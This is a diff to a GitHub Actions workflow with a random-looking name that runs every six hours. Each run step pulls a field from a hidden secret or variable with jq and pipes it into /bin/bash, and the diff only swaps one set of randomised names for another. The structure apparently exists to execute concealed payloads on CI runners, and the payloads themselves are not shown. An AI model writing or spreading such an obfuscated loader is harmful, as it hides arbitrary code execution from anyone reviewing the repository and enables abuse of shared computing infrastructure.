@@ -3,32 +3,25 @@ name: houchourendzg
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 0/6 * * *'
-jobs:  # 31924
+    - cron: '22 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: houchourendzg
         env:
-          fa14: ${{ secrets.fa14 }}
+          a2: ${{ secrets.a2 }}
         run: |
-          echo $fa14 | jq -r .yr351 | /bin/bash
-          echo $rwpr4 | jq -r .obr5626 | /bin/bash
-          echo $cp4 | jq -r .l47987 | /bin/bash
-          echo $ie9597 | jq -r .whtzj66 | /bin/bash
-          echo $gnl378 | jq -r .w9 | /bin/bash
-          echo $e43 | jq -r .m10 | /bin/bash
-          echo $fit26 | jq -r .cl1074 | /bin/bash
-          echo $rkpq30689 | jq -r .wvle39 | /bin/bash
-          echo $o05944 | jq -r .x7758 | /bin/bash
-          echo $odsjp37736 | jq -r .wrzig42004 | /bin/bash
-          echo $o89022 | jq -r .ywove43620 | /bin/bash
-          echo $it96164 | jq -r .kocgi5 | /bin/bash
-          echo $vngc64 | jq -r .h8 | /bin/bash
-          echo $eh6538 | jq -r .a10 | /bin/bash
-          echo $vua0703 | jq -r .olz81 | /bin/bash
-          echo $jitlr90622 | jq -r .jkd2512 | /bin/bash
-          echo $sacq763 | jq -r .h2 | /bin/bash
-          echo $llrrn7482 | jq -r .f7 | /bin/bash
+          echo $a2 | jq -r .o09 | /bin/bash
+          echo $m14997 | jq -r .qskr73 | /bin/bash
+          echo $qt17033 | jq -r .ubf18 | /bin/bash
+          echo $t92 | jq -r .mhs12257 | /bin/bash
+          echo $qhn2165 | jq -r .bemxs52740 | /bin/bash
+          echo $yh463 | jq -r .g3336 | /bin/bash
+          echo $sicn1743 | jq -r .rtpq7166 | /bin/bash
+          echo $p9618 | jq -r .cg6 | /bin/bash
+          echo $v24003 | jq -r .x64 | /bin/bash
+          echo $hqvms4 | jq -r .xeik40105 | /bin/bash
 
